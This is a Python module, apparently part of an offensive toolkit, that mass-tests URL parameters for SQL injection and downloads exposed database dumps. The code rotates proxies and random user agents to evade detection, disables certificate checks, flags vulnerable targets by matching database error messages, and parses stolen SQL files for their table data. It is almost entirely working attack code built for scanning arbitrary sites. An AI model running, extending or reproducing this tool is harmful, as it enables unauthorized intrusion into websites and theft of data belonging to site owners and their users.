"""
Scanner Module - SQL Injection Detection and Database Extraction
"""

import requests
import re
import os
import time
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from colorama import Fore, Style
from payload_module import SQLIPayloads

class SQLChecker:
    """SQL Injection vulnerability checker"""
    
    def __init__(self, proxy_manager=None, aggressive=False, threads=10):
        self.proxy_manager = proxy_manager
        self.ua = UserAgent()
        self.aggressive = aggressive
        self.threads = threads
        self.payloads = SQLIPayloads()
        
        # SQL error patterns
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.* SQL[-_ ]*Server",
            r"OLE DB.* SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
        ]
    
    def get_headers(self):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
    
    def check_sql_error(self, response_text: str) -> bool:
        """Check for SQL error patterns in response"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def test_url_with_payloads(self, url: str) -> Optional[Dict]:
        """Test URL with SQL injection payloads"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return None
        
        # Get payloads based on mode
        if self.aggressive:
            payload_list = self.payloads.get_all_payloads()
        else:
            payload_list = self.payloads.get_basic_payloads()
        
        for param_name in params.keys():
            for payload in payload_list:
                try:
                    # Get proxy if available
                    proxies = {}
                    if self.proxy_manager:
                        proxy = self.proxy_manager.get_proxy()
                        if proxy:
                            proxy_url = f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"
                            proxies = {'http': proxy_url, 'https': proxy_url}
                    
                    # Create test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                         parsed.params, new_query, parsed.fragment))
                    
                    # Make request
                    response = requests.get(
                        test_url,
                        headers=self.get_headers(),
                        proxies=proxies,
                        timeout=5,
                        verify=False
                    )
                    
                    # Check for SQL errors
                    if self.check_sql_error(response.text):
                        return {
                            'url': url,
                            'vulnerable_param': param_name,
                            'payload': payload,
                            'status_code': response.status_code,
                            'response_length': len(response.text)
                        }
                    
                except Exception as e:
                    continue
        
        return None
    
    def check_urls(self, urls: List[str]) -> List[Dict]:
        """Check multiple URLs for SQL injection"""
        vulnerable_urls = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {executor.submit(self.test_url_with_payloads, url): url for url in urls}
            
            for future in tqdm(as_completed(future_to_url), total=len(urls),
                             desc="Testing URLs", unit="url", ncols=80):
                try:
                    result = future.result()
                    if result:
                        vulnerable_urls.append(result)
                        print(f"\n{Fore.RED}[VULN] {result['url']}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}  └─ Param: {result['vulnerable_param']}{Style.RESET_ALL}")
                except:
                    continue
        
        return vulnerable_urls


class DatabaseDownloader:
    """Database file downloader and parser"""
    
    def __init__(self, proxy_manager=None, output_dir="downloads"):
        self.proxy_manager = proxy_manager
        self.ua = UserAgent()
        self.output_dir = output_dir
        self.downloaded_files = []
        
        os.makedirs(output_dir, exist_ok=True)
        
        self.db_extensions = ['.sql', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf']
        self.db_keywords = ['database', 'dump', 'backup', 'sql', 'db']
    
    def get_headers(self):
        return {
            'User-Agent': self.ua.random,
            'Accept': '*/*',
        }
    
    def is_database_url(self, url: str) -> bool:
        """Check if URL points to a database file"""
        url_lower = url.lower()
        parsed = urlparse(url)
        path = parsed.path.lower()
        
        # Check extension
        for ext in self.db_extensions:
            if path.endswith(ext):
                return True
        
        # Check keywords
        for keyword in self.db_keywords:
            if keyword in path:
                return True
        
        return False
    
    def download_file(self, url: str) -> Optional[str]:
        """Download a file from URL"""
        try:
            # Get proxy if available
            proxies = {}
            if self.proxy_manager:
                proxy = self.proxy_manager.get_proxy()
                if proxy:
                    proxy_url = f"{proxy['protocol']}://{proxy['ip']}:{proxy['port']}"
                    proxies = {'http': proxy_url, 'https': proxy_url}
            
            response = requests.get(
                url,
                headers=self.get_headers(),
                proxies=proxies,
                timeout=30,
                stream=True,
                verify=False
            )
            
            if response.status_code == 200:
                parsed = urlparse(url)
                filename = os.path.basename(parsed.path) or "downloaded_file"
                
                # Ensure unique filename
                filepath = os.path.join(self.output_dir, filename)
                counter = 1
                while os.path.exists(filepath):
                    name, ext = os.path.splitext(filename)
                    filepath = os.path.join(self.output_dir, f"{name}_{counter}{ext}")
                    counter += 1
                
                # Download file
                with open(filepath, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                return filepath
                
        except Exception as e:
            pass
        
        return None
    
    def parse_sql_file(self, filepath: str) -> List[Dict]:
        """Parse SQL file and extract data"""
        data = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
                # Extract INSERT statements
                insert_pattern = r'INSERT\s+INTO\s+(\w+)\s*\([^)]+\)\s*VALUES\s*\([^)]+\)'
                matches = re.finditer(insert_pattern, content, re.IGNORECASE)
                
                for match in matches:
                    table_name = match.group(1)
                    values = match.group(0)
                    data.append({
                        'table': table_name,
                        'data': values,
                        'type': 'insert'
                    })
                
                # Extract CREATE TABLE statements
                create_pattern = r'CREATE\s+TABLE\s+(\w+)[^;]+;'
                matches = re.finditer(create_pattern, content, re.IGNORECASE | re.DOTALL)
                
                for match in matches:
                    table_name = match.group(1)
                    data.append({
                        'table': table_name,
                        'data': match.group(0),
                        'type': 'schema'
                    })
                
        except Exception as e:
            pass
        
        return data
    
    def extract_data_from_urls(self, urls: List[str]) -> List[Dict]:
        """Extract and download database files from URLs"""
        extracted_data = []
        
        for i, url in enumerate(urls, 1):
            if self.is_database_url(url):
                print(f"{Fore.CYAN}[*] Found database URL: {url[:60]}...{Style.RESET_ALL}")
                filepath = self.download_file(url)
                if filepath:
                    print(f"{Fore.GREEN}[+] Downloaded: {filepath}{Style.RESET_ALL}")
                    parsed_data = self.parse_sql_file(filepath)
                    extracted_data.extend(parsed_data)
                    self.downloaded_files.append({
                        'url': url,
                        'filepath': filepath,
                        'data': parsed_data
                    })
                time.sleep(1)
        
        return extracted_data
